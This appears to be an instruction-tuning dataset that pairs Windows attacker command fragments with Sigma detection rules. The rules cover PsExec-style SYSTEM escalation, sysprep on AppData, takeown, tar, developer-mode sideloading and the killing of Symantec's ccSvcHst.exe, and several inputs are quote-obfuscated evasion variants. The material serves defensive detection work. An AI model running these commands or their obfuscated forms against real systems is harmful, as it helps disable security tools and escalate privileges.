{"instruction": "Write Sigma rule to detect payload:", "input": "-s cmd -s -i cmd -i -s cmd -s pwsh -s -i pwsh -i -s pwsh -s powershell -s -i powershell -i -s powershell paexec PsExec accepteula", "output": "title: Potential Privilege Escalation To LOCAL SYSTEM\nid: 207b0396-3689-42d9-8399-4222658efc99\nrelated:\n    - id: 8834e2f7-6b4b-4f09-8906-d2276470ee23 # PsExec specific rule\n      type: similar\nstatus: test\ndescription: Detects unknown program using commandline flags usually used by tools such as PsExec and PAExec to start programs with SYSTEM Privileges\nreferences:\n    - https://learn.microsoft.com/en-us/sysinternals/downloads/psexec\n    - https://www.poweradmin.com/paexec/\n    - https://www.fireeye.com/blog/threat-research/2020/10/kegtap-and-singlemalt-with-a-ransomware-chaser.html\nauthor: Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)\ndate: 2021-05-22\nmodified: 2024-03-05\ntags:\n    - attack.resource-development\n    - attack.t1587.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        # Escalation to LOCAL_SYSTEM\n        CommandLine|contains|windash:\n            # Note that you don't need to add the \".exe\" part when using psexec/paexec\n            # The \"-\" can also be replaced with \"/\"\n            # The order of args isn't important\n            # \"cmd\" can be replaced by \"powershell\", \"pwsh\" or any other console like software\n            - ' -s cmd'\n            - ' -s -i cmd'\n            - ' -i -s cmd'\n            # Pwsh (For PowerShell 7)\n            - ' -s pwsh'\n            - ' -s -i pwsh'\n            - ' -i -s pwsh'\n            # PowerShell (For PowerShell 5)\n            - ' -s powershell'\n            - ' -s -i powershell'\n            - ' -i -s powershell'\n    filter_main_exclude_coverage:\n        # This filter exclude strings covered by 8834e2f7-6b4b-4f09-8906-d2276470ee23\n        CommandLine|contains:\n            - 'paexec'\n            - 'PsExec'\n            - 'accepteula'\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Weird admins that rename their tools\n    - Software companies that bundle PsExec/PAExec with their software and rename it, so that it is less embarrassing\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\sysprep.exe \\AppData\\", "output": "title: Sysprep on AppData Folder\nid: d5b9ae7a-e6fc-405e-80ff-2ff9dcc64e7e\nstatus: test\ndescription: Detects suspicious sysprep process start with AppData folder as target (as used by Trojan Syndicasec in Thrip report by Symantec)\nreferences:\n    - https://www.symantec.com/blogs/threat-intelligence/thrip-hits-satellite-telecoms-defense-targets\n    - https://app.any.run/tasks/61a296bb-81ad-4fee-955f-3b399f4aaf4b\nauthor: Florian Roth (Nextron Systems)\ndate: 2018-06-22\nmodified: 2021-11-27\ntags:\n    - attack.execution\n    - attack.t1059\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\sysprep.exe'\n        CommandLine|contains: '\\AppData\\'\n    condition: selection\nfalsepositives:\n    - False positives depend on scripts and administrative tools used in the monitored environment\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\sysprep.exe \"\\\"\"A\"\"p\"\"p\"\"D\"\"a\"\"t\"\"a\"\"\\\"", "output": "title: Sysprep on AppData Folder\nid: d5b9ae7a-e6fc-405e-80ff-2ff9dcc64e7e\nstatus: test\ndescription: Detects suspicious sysprep process start with AppData folder as target (as used by Trojan Syndicasec in Thrip report by Symantec)\nreferences:\n    - https://www.symantec.com/blogs/threat-intelligence/thrip-hits-satellite-telecoms-defense-targets\n    - https://app.any.run/tasks/61a296bb-81ad-4fee-955f-3b399f4aaf4b\nauthor: Florian Roth (Nextron Systems)\ndate: 2018-06-22\nmodified: 2021-11-27\ntags:\n    - attack.execution\n    - attack.t1059\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\sysprep.exe'\n        CommandLine|contains: '\\AppData\\'\n    condition: selection\nfalsepositives:\n    - False positives depend on scripts and administrative tools used in the monitored environment\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\sysprep \\AppData\\", "output": "title: Sysprep on AppData Folder\nid: d5b9ae7a-e6fc-405e-80ff-2ff9dcc64e7e\nstatus: test\ndescription: Detects suspicious sysprep process start with AppData folder as target (as used by Trojan Syndicasec in Thrip report by Symantec)\nreferences:\n    - https://www.symantec.com/blogs/threat-intelligence/thrip-hits-satellite-telecoms-defense-targets\n    - https://app.any.run/tasks/61a296bb-81ad-4fee-955f-3b399f4aaf4b\nauthor: Florian Roth (Nextron Systems)\ndate: 2018-06-22\nmodified: 2021-11-27\ntags:\n    - attack.execution\n    - attack.t1059\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\sysprep.exe'\n        CommandLine|contains: '\\AppData\\'\n    condition: selection\nfalsepositives:\n    - False positives depend on scripts and administrative tools used in the monitored environment\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\sysprep.exe \\AppData\\", "output": "title: Sysprep on AppData Folder\nid: d5b9ae7a-e6fc-405e-80ff-2ff9dcc64e7e\nstatus: test\ndescription: Detects suspicious sysprep process start with AppData folder as target (as used by Trojan Syndicasec in Thrip report by Symantec)\nreferences:\n    - https://www.symantec.com/blogs/threat-intelligence/thrip-hits-satellite-telecoms-defense-targets\n    - https://app.any.run/tasks/61a296bb-81ad-4fee-955f-3b399f4aaf4b\nauthor: Florian Roth (Nextron Systems)\ndate: 2018-06-22\nmodified: 2021-11-27\ntags:\n    - attack.execution\n    - attack.t1059\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\sysprep.exe'\n        CommandLine|contains: '\\AppData\\'\n    condition: selection\nfalsepositives:\n    - False positives depend on scripts and administrative tools used in the monitored environment\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\systeminfo.exe sysinfo.exe", "output": "title: Suspicious Execution of Systeminfo\nid: 0ef56343-059e-4cb6-adc1-4c3c967c5e46\nstatus: test\ndescription: Detects usage of the \"systeminfo\" command to retrieve information\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1082/T1082.md#atomic-test-1---system-information-discovery\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/systeminfo\nauthor: frack113\ndate: 2022-01-01\nmodified: 2022-07-14\ntags:\n    - attack.discovery\n    - attack.t1082\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\systeminfo.exe'\n        - OriginalFileName: 'sysinfo.exe'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\systeminfo.exe sysin\\\"fo.exe\\\"", "output": "title: Suspicious Execution of Systeminfo\nid: 0ef56343-059e-4cb6-adc1-4c3c967c5e46\nstatus: test\ndescription: Detects usage of the \"systeminfo\" command to retrieve information\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1082/T1082.md#atomic-test-1---system-information-discovery\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/systeminfo\nauthor: frack113\ndate: 2022-01-01\nmodified: 2022-07-14\ntags:\n    - attack.discovery\n    - attack.t1082\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\systeminfo.exe'\n        - OriginalFileName: 'sysinfo.exe'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\systeminfo sysinfo", "output": "title: Suspicious Execution of Systeminfo\nid: 0ef56343-059e-4cb6-adc1-4c3c967c5e46\nstatus: test\ndescription: Detects usage of the \"systeminfo\" command to retrieve information\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1082/T1082.md#atomic-test-1---system-information-discovery\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/systeminfo\nauthor: frack113\ndate: 2022-01-01\nmodified: 2022-07-14\ntags:\n    - attack.discovery\n    - attack.t1082\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\systeminfo.exe'\n        - OriginalFileName: 'sysinfo.exe'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\systeminfo.exe sysinfo.exe", "output": "title: Suspicious Execution of Systeminfo\nid: 0ef56343-059e-4cb6-adc1-4c3c967c5e46\nstatus: test\ndescription: Detects usage of the \"systeminfo\" command to retrieve information\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1082/T1082.md#atomic-test-1---system-information-discovery\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/systeminfo\nauthor: frack113\ndate: 2022-01-01\nmodified: 2022-07-14\ntags:\n    - attack.discovery\n    - attack.t1082\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\systeminfo.exe'\n        - OriginalFileName: 'sysinfo.exe'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\SystemSettingsAdminFlows.exe SystemSettingsAdminFlows.EXE TurnOnDeveloperFeatures DeveloperUnlock EnableSideloading", "output": "title: Potential Signing Bypass Via Windows Developer Features\nid: a383dec4-deec-4e6e-913b-ed9249670848\nrelated:\n    - id: b110ebaf-697f-4da1-afd5-b536fa27a2c1\n      type: similar\nstatus: test\ndescription: Detects when a user enable developer features such as \"Developer Mode\" or \"Application Sideloading\". Which allows the user to install untrusted packages.\nreferences:\n    - Internal Research\n    - https://www.sentinelone.com/labs/inside-malicious-windows-apps-for-malware-deployment/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-01-11\ntags:\n    - attack.defense-evasion\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\SystemSettingsAdminFlows.exe'\n        - OriginalFileName: 'SystemSettingsAdminFlows.EXE'\n    selection_flag:\n        CommandLine|contains: 'TurnOnDeveloperFeatures'\n    selection_options:\n        CommandLine|contains:\n            - 'DeveloperUnlock'\n            - 'EnableSideloading'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\SystemSettingsAdminFlows.exe SystemSettingsAdminFlows.EXE TurnOnDeveloperFeatures DeveloperUnlock \"E\"\"n\"\"a\"\"b\"\"l\"\"e\"\"S\"\"i\"\"d\"\"e\"\"l\"\"o\"\"a\"\"d\"\"i\"\"n\"\"g\"", "output": "title: Potential Signing Bypass Via Windows Developer Features\nid: a383dec4-deec-4e6e-913b-ed9249670848\nrelated:\n    - id: b110ebaf-697f-4da1-afd5-b536fa27a2c1\n      type: similar\nstatus: test\ndescription: Detects when a user enable developer features such as \"Developer Mode\" or \"Application Sideloading\". Which allows the user to install untrusted packages.\nreferences:\n    - Internal Research\n    - https://www.sentinelone.com/labs/inside-malicious-windows-apps-for-malware-deployment/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-01-11\ntags:\n    - attack.defense-evasion\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\SystemSettingsAdminFlows.exe'\n        - OriginalFileName: 'SystemSettingsAdminFlows.EXE'\n    selection_flag:\n        CommandLine|contains: 'TurnOnDeveloperFeatures'\n    selection_options:\n        CommandLine|contains:\n            - 'DeveloperUnlock'\n            - 'EnableSideloading'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\SystemSettingsAdminFlows SystemSettingsAdminFlows TurnOnDeveloperFeatures DeveloperUnlock EnableSideloading", "output": "title: Potential Signing Bypass Via Windows Developer Features\nid: a383dec4-deec-4e6e-913b-ed9249670848\nrelated:\n    - id: b110ebaf-697f-4da1-afd5-b536fa27a2c1\n      type: similar\nstatus: test\ndescription: Detects when a user enable developer features such as \"Developer Mode\" or \"Application Sideloading\". Which allows the user to install untrusted packages.\nreferences:\n    - Internal Research\n    - https://www.sentinelone.com/labs/inside-malicious-windows-apps-for-malware-deployment/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-01-11\ntags:\n    - attack.defense-evasion\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\SystemSettingsAdminFlows.exe'\n        - OriginalFileName: 'SystemSettingsAdminFlows.EXE'\n    selection_flag:\n        CommandLine|contains: 'TurnOnDeveloperFeatures'\n    selection_options:\n        CommandLine|contains:\n            - 'DeveloperUnlock'\n            - 'EnableSideloading'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\SystemSettingsAdminFlows.exe TurnOnDeveloperFeatures SystemSettingsAdminFlows.EXE EnableSideloading DeveloperUnlock", "output": "title: Potential Signing Bypass Via Windows Developer Features\nid: a383dec4-deec-4e6e-913b-ed9249670848\nrelated:\n    - id: b110ebaf-697f-4da1-afd5-b536fa27a2c1\n      type: similar\nstatus: test\ndescription: Detects when a user enable developer features such as \"Developer Mode\" or \"Application Sideloading\". Which allows the user to install untrusted packages.\nreferences:\n    - Internal Research\n    - https://www.sentinelone.com/labs/inside-malicious-windows-apps-for-malware-deployment/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-01-11\ntags:\n    - attack.defense-evasion\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\SystemSettingsAdminFlows.exe'\n        - OriginalFileName: 'SystemSettingsAdminFlows.EXE'\n    selection_flag:\n        CommandLine|contains: 'TurnOnDeveloperFeatures'\n    selection_options:\n        CommandLine|contains:\n            - 'DeveloperUnlock'\n            - 'EnableSideloading'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\takeown.exe /f /r", "output": "title: Suspicious Recursive Takeown\nid: 554601fb-9b71-4bcc-abf4-21a611be4fde\nstatus: test\ndescription: Adversaries can interact with the DACLs using built-in Windows commands takeown which can grant adversaries higher permissions on specific files and folders\nreferences:\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/takeown\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1222.001/T1222.001.md#atomic-test-1---take-ownership-using-takeown-utility\nauthor: frack113\ndate: 2022-01-30\nmodified: 2022-11-21\ntags:\n    - attack.defense-evasion\n    - attack.t1222.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\takeown.exe'\n        CommandLine|contains|all:\n            - '/f '\n            - '/r'\n    condition: selection\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Scripts created by developers and admins\n    - Administrative activity\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\takeown /f /r", "output": "title: Suspicious Recursive Takeown\nid: 554601fb-9b71-4bcc-abf4-21a611be4fde\nstatus: test\ndescription: Adversaries can interact with the DACLs using built-in Windows commands takeown which can grant adversaries higher permissions on specific files and folders\nreferences:\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/takeown\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1222.001/T1222.001.md#atomic-test-1---take-ownership-using-takeown-utility\nauthor: frack113\ndate: 2022-01-30\nmodified: 2022-11-21\ntags:\n    - attack.defense-evasion\n    - attack.t1222.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\takeown.exe'\n        CommandLine|contains|all:\n            - '/f '\n            - '/r'\n    condition: selection\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Scripts created by developers and admins\n    - Administrative activity\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\takeown.exe /f /r", "output": "title: Suspicious Recursive Takeown\nid: 554601fb-9b71-4bcc-abf4-21a611be4fde\nstatus: test\ndescription: Adversaries can interact with the DACLs using built-in Windows commands takeown which can grant adversaries higher permissions on specific files and folders\nreferences:\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/takeown\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1222.001/T1222.001.md#atomic-test-1---take-ownership-using-takeown-utility\nauthor: frack113\ndate: 2022-01-30\nmodified: 2022-11-21\ntags:\n    - attack.defense-evasion\n    - attack.t1222.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\takeown.exe'\n        CommandLine|contains|all:\n            - '/f '\n            - '/r'\n    condition: selection\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Scripts created by developers and admins\n    - Administrative activity\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\tar.exe bsdtar -c -r -u", "output": "title: Compressed File Creation Via Tar.EXE\nid: 418a3163-3247-4b7b-9933-dcfcb7c52ea9\nstatus: test\ndescription: |\n    Detects execution of \"tar.exe\" in order to create a compressed file.\n    Adversaries may abuse various utilities to compress or encrypt data before exfiltration.\nreferences:\n    - https://unit42.paloaltonetworks.com/chromeloader-malware/\n    - https://lolbas-project.github.io/lolbas/Binaries/Tar/\n    - https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/cicada-apt10-japan-espionage\nauthor: Nasreddine Bencherchali (Nextron Systems), AdmU3\ndate: 2023-12-19\ntags:\n    - attack.collection\n    - attack.exfiltration\n    - attack.t1560\n    - attack.t1560.001\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\tar.exe'\n        - OriginalFileName: 'bsdtar'\n    selection_create:\n        CommandLine|contains:\n            - '-c'\n            - '-r'\n            - '-u'\n    condition: all of selection_*\nfalsepositives:\n    - Likely\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\tar.exe \\\"bsdtar\\\" \\\"-c\\\" -r -u", "output": "title: Compressed File Creation Via Tar.EXE\nid: 418a3163-3247-4b7b-9933-dcfcb7c52ea9\nstatus: test\ndescription: |\n    Detects execution of \"tar.exe\" in order to create a compressed file.\n    Adversaries may abuse various utilities to compress or encrypt data before exfiltration.\nreferences:\n    - https://unit42.paloaltonetworks.com/chromeloader-malware/\n    - https://lolbas-project.github.io/lolbas/Binaries/Tar/\n    - https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/cicada-apt10-japan-espionage\nauthor: Nasreddine Bencherchali (Nextron Systems), AdmU3\ndate: 2023-12-19\ntags:\n    - attack.collection\n    - attack.exfiltration\n    - attack.t1560\n    - attack.t1560.001\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\tar.exe'\n        - OriginalFileName: 'bsdtar'\n    selection_create:\n        CommandLine|contains:\n            - '-c'\n            - '-r'\n            - '-u'\n    condition: all of selection_*\nfalsepositives:\n    - Likely\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\tar bsdtar -c -r -u", "output": "title: Compressed File Creation Via Tar.EXE\nid: 418a3163-3247-4b7b-9933-dcfcb7c52ea9\nstatus: test\ndescription: |\n    Detects execution of \"tar.exe\" in order to create a compressed file.\n    Adversaries may abuse various utilities to compress or encrypt data before exfiltration.\nreferences:\n    - https://unit42.paloaltonetworks.com/chromeloader-malware/\n    - https://lolbas-project.github.io/lolbas/Binaries/Tar/\n    - https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/cicada-apt10-japan-espionage\nauthor: Nasreddine Bencherchali (Nextron Systems), AdmU3\ndate: 2023-12-19\ntags:\n    - attack.collection\n    - attack.exfiltration\n    - attack.t1560\n    - attack.t1560.001\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\tar.exe'\n        - OriginalFileName: 'bsdtar'\n    selection_create:\n        CommandLine|contains:\n            - '-c'\n            - '-r'\n            - '-u'\n    condition: all of selection_*\nfalsepositives:\n    - Likely\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\tar.exe bsdtar -c -u -r", "output": "title: Compressed File Creation Via Tar.EXE\nid: 418a3163-3247-4b7b-9933-dcfcb7c52ea9\nstatus: test\ndescription: |\n    Detects execution of \"tar.exe\" in order to create a compressed file.\n    Adversaries may abuse various utilities to compress or encrypt data before exfiltration.\nreferences:\n    - https://unit42.paloaltonetworks.com/chromeloader-malware/\n    - https://lolbas-project.github.io/lolbas/Binaries/Tar/\n    - https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/cicada-apt10-japan-espionage\nauthor: Nasreddine Bencherchali (Nextron Systems), AdmU3\ndate: 2023-12-19\ntags:\n    - attack.collection\n    - attack.exfiltration\n    - attack.t1560\n    - attack.t1560.001\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\tar.exe'\n        - OriginalFileName: 'bsdtar'\n    selection_create:\n        CommandLine|contains:\n            - '-c'\n            - '-r'\n            - '-u'\n    condition: all of selection_*\nfalsepositives:\n    - Likely\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\tar.exe bsdtar -x", "output": "title: Compressed File Extraction Via Tar.EXE\nid: bf361876-6620-407a-812f-bfe11e51e924\nstatus: test\ndescription: |\n    Detects execution of \"tar.exe\" in order to extract compressed file.\n    Adversaries may abuse various utilities in order to decompress data to avoid detection.\nreferences:\n    - https://unit42.paloaltonetworks.com/chromeloader-malware/\n    - https://lolbas-project.github.io/lolbas/Binaries/Tar/\n    - https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/cicada-apt10-japan-espionage\nauthor: AdmU3\ndate: 2023-12-19\ntags:\n    - attack.collection\n    - attack.exfiltration\n    - attack.t1560\n    - attack.t1560.001\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\tar.exe'\n        - OriginalFileName: 'bsdtar'\n    selection_extract:\n        CommandLine|contains: '-x'\n    condition: all of selection_*\nfalsepositives:\n    - Likely\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\tar.exe \\\"b\\\"\\\"s\\\"\\\"d\\\"\\\"t\\\"\\\"a\\\"\\\"r\\\" -x", "output": "title: Compressed File Extraction Via Tar.EXE\nid: bf361876-6620-407a-812f-bfe11e51e924\nstatus: test\ndescription: |\n    Detects execution of \"tar.exe\" in order to extract compressed file.\n    Adversaries may abuse various utilities in order to decompress data to avoid detection.\nreferences:\n    - https://unit42.paloaltonetworks.com/chromeloader-malware/\n    - https://lolbas-project.github.io/lolbas/Binaries/Tar/\n    - https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/cicada-apt10-japan-espionage\nauthor: AdmU3\ndate: 2023-12-19\ntags:\n    - attack.collection\n    - attack.exfiltration\n    - attack.t1560\n    - attack.t1560.001\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\tar.exe'\n        - OriginalFileName: 'bsdtar'\n    selection_extract:\n        CommandLine|contains: '-x'\n    condition: all of selection_*\nfalsepositives:\n    - Likely\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\tar bsdtar -x", "output": "title: Compressed File Extraction Via Tar.EXE\nid: bf361876-6620-407a-812f-bfe11e51e924\nstatus: test\ndescription: |\n    Detects execution of \"tar.exe\" in order to extract compressed file.\n    Adversaries may abuse various utilities in order to decompress data to avoid detection.\nreferences:\n    - https://unit42.paloaltonetworks.com/chromeloader-malware/\n    - https://lolbas-project.github.io/lolbas/Binaries/Tar/\n    - https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/cicada-apt10-japan-espionage\nauthor: AdmU3\ndate: 2023-12-19\ntags:\n    - attack.collection\n    - attack.exfiltration\n    - attack.t1560\n    - attack.t1560.001\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\tar.exe'\n        - OriginalFileName: 'bsdtar'\n    selection_extract:\n        CommandLine|contains: '-x'\n    condition: all of selection_*\nfalsepositives:\n    - Likely\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\tar.exe -x bsdtar", "output": "title: Compressed File Extraction Via Tar.EXE\nid: bf361876-6620-407a-812f-bfe11e51e924\nstatus: test\ndescription: |\n    Detects execution of \"tar.exe\" in order to extract compressed file.\n    Adversaries may abuse various utilities in order to decompress data to avoid detection.\nreferences:\n    - https://unit42.paloaltonetworks.com/chromeloader-malware/\n    - https://lolbas-project.github.io/lolbas/Binaries/Tar/\n    - https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/cicada-apt10-japan-espionage\nauthor: AdmU3\ndate: 2023-12-19\ntags:\n    - attack.collection\n    - attack.exfiltration\n    - attack.t1560\n    - attack.t1560.001\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\tar.exe'\n        - OriginalFileName: 'bsdtar'\n    selection_extract:\n        CommandLine|contains: '-x'\n    condition: all of selection_*\nfalsepositives:\n    - Likely\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "taskkill /F /IM ccSvcHst.exe", "output": "title: Taskkill Symantec Endpoint Protection\nid: 4a6713f6-3331-11ed-a261-0242ac120002\nstatus: test\ndescription: |\n    Detects one of the possible scenarios for disabling Symantec Endpoint Protection.\n    Symantec Endpoint Protection antivirus software services incorrectly implement the protected service mechanism.\n    As a result, the NT AUTHORITY/SYSTEM user can execute the taskkill /im command several times ccSvcHst.exe /f, thereby killing the process belonging to the service, and thus shutting down the service.\nreferences:\n    - https://www.exploit-db.com/exploits/37525\n    - https://community.spiceworks.com/topic/2195015-batch-script-to-uninstall-symantec-endpoint-protection\n    - https://community.broadcom.com/symantecenterprise/communities/community-home/digestviewer/viewthread?MessageKey=6ce94b67-74e1-4333-b16f-000b7fd874f0&CommunityKey=1ecf5f55-9545-44d6-b0f4-4e4a7f5f5e68&tab=digestviewer\nauthor: Ilya Krestinichev, Florian Roth (Nextron Systems)\ndate: 2022-09-13\ntags:\n    - attack.defense-evasion\n    - attack.t1562.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'taskkill'\n            - ' /F '\n            - ' /IM '\n            - 'ccSvcHst.exe'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "taskkill /F /IM \\\"ccSvcHst.exe\\\"", "output": "title: Taskkill Symantec Endpoint Protection\nid: 4a6713f6-3331-11ed-a261-0242ac120002\nstatus: test\ndescription: |\n    Detects one of the possible scenarios for disabling Symantec Endpoint Protection.\n    Symantec Endpoint Protection antivirus software services incorrectly implement the protected service mechanism.\n    As a result, the NT AUTHORITY/SYSTEM user can execute the taskkill /im command several times ccSvcHst.exe /f, thereby killing the process belonging to the service, and thus shutting down the service.\nreferences:\n    - https://www.exploit-db.com/exploits/37525\n    - https://community.spiceworks.com/topic/2195015-batch-script-to-uninstall-symantec-endpoint-protection\n    - https://community.broadcom.com/symantecenterprise/communities/community-home/digestviewer/viewthread?MessageKey=6ce94b67-74e1-4333-b16f-000b7fd874f0&CommunityKey=1ecf5f55-9545-44d6-b0f4-4e4a7f5f5e68&tab=digestviewer\nauthor: Ilya Krestinichev, Florian Roth (Nextron Systems)\ndate: 2022-09-13\ntags:\n    - attack.defense-evasion\n    - attack.t1562.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'taskkill'\n            - ' /F '\n            - ' /IM '\n            - 'ccSvcHst.exe'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "taskkill /F /IM ccSvcHst", "output": "title: Taskkill Symantec Endpoint Protection\nid: 4a6713f6-3331-11ed-a261-0242ac120002\nstatus: test\ndescription: |\n    Detects one of the possible scenarios for disabling Symantec Endpoint Protection.\n    Symantec Endpoint Protection antivirus software services incorrectly implement the protected service mechanism.\n    As a result, the NT AUTHORITY/SYSTEM user can execute the taskkill /im command several times ccSvcHst.exe /f, thereby killing the process belonging to the service, and thus shutting down the service.\nreferences:\n    - https://www.exploit-db.com/exploits/37525\n    - https://community.spiceworks.com/topic/2195015-batch-script-to-uninstall-symantec-endpoint-protection\n    - https://community.broadcom.com/symantecenterprise/communities/community-home/digestviewer/viewthread?MessageKey=6ce94b67-74e1-4333-b16f-000b7fd874f0&CommunityKey=1ecf5f55-9545-44d6-b0f4-4e4a7f5f5e68&tab=digestviewer\nauthor: Ilya Krestinichev, Florian Roth (Nextron Systems)\ndate: 2022-09-13\ntags:\n    - attack.defense-evasion\n    - attack.t1562.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'taskkill'\n            - ' /F '\n            - ' /IM '\n            - 'ccSvcHst.exe'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
